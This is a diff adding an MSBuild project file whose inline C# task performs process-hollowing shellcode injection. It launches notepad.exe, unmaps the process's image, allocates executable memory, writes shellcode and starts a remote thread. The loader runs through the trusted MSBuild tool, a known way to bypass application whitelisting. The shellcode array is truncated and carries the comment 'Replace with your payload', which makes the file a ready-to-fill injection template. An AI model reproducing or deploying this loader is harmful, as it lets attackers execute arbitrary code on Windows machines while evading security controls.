@@ -1,0 +1,88 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Hello">
+    <ClassExample />
+  </Target>
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Reference Include="C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+          using System;
+          using System.Diagnostics;
+          using System.Runtime.InteropServices;
+          using Microsoft.Build.Framework;
+          using Microsoft.Build.Utilities;
+
+          public class ClassExample : Task, ITask
+          {
+              [DllImport("kernel32.dll", SetLastError = true)]
+              static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+
+              [DllImport("kernel32.dll", SetLastError = true)]
+              static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+              [DllImport("kernel32.dll", SetLastError = true)]
+              static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+
+              [DllImport("kernel32.dll", SetLastError = true)]
+              static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+              [DllImport("ntdll.dll", SetLastError = true)]
+              static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
+
+              [DllImport("kernel32.dll", SetLastError = true)]
+              static extern bool CloseHandle(IntPtr hObject);
+
+              public static void Main(string[] args)
+              {
+                  // Example shellcode: Replace with your payload
+                  byte[] shellcode = new byte[] {
+                      0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00,
+                      // Add the rest of your shellcode here
+                  };
+
+                  string targetProcess = "notepad.exe";
+
+                  // Start the target process
+                  Process proc = new Process
+                  {
+                      StartInfo = new ProcessStartInfo(targetProcess)
+                      {
+                          UseShellExecute = false,
+                          CreateNoWindow = true
+                      }
+                  };
+                  proc.Start();
+                  proc.WaitForInputIdle();
+
+                  IntPtr hProcess = OpenProcess(0x001F0FFF, false, (uint)proc.Id);
+
+                  // Unmap and allocate new memory
+                  NtUnmapViewOfSection(hProcess, (IntPtr)0x00400000);
+                  IntPtr allocAddress = VirtualAllocEx(hProcess, (IntPtr)0x00400000, (uint)shellcode.Length, 0x3000, 0x40);
+
+                  // Write shellcode to memory
+                  IntPtr bytesWritten;
+                  WriteProcessMemory(hProcess, allocAddress, shellcode, (uint)shellcode.Length, out bytesWritten);
+
+                  // Start remote thread
+                  CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocAddress, IntPtr.Zero, 0, IntPtr.Zero);
+
+                  // Cleanup
+                  CloseHandle(hProcess);
+              }
+
+              public override bool Execute()
+              {
+                  Main(new string[0]);
+                  return true;
+              }
+          }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
